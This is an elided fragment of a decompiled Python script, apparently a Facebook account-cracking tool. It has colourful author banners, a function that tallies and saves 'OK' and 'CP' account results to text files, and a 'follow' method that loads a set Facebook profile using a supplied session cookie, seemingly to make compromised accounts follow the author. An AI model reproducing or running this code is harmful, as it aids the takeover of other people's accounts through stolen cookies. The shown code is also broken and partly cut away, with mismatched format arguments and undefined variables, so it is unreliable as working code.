# Decompile by HERON (Tools By HERON-DECORDER,PRO)
# Time Succes decompile : 2023-02-28 17:34:47.432353
import os
try:
    import requests
except ImportError:
...
\033[1;92m༄Mr.᭄\x1b[1;90m═══════════════════════════════════════════════\x1b[1;92m༄KAUSAR᭄
                           ...
                           \x1b[1;92m║➣AUTHOR    : MR. RIDOY      ║
                           \x1b[1;92m║➣GITHUB    : respectHRidoy9x9 ║
                           \x1b[1;92m║➣FACEBOOK  : HRI DOY  ║
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mHRI DOY-OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mHRI DOY-CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://x.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
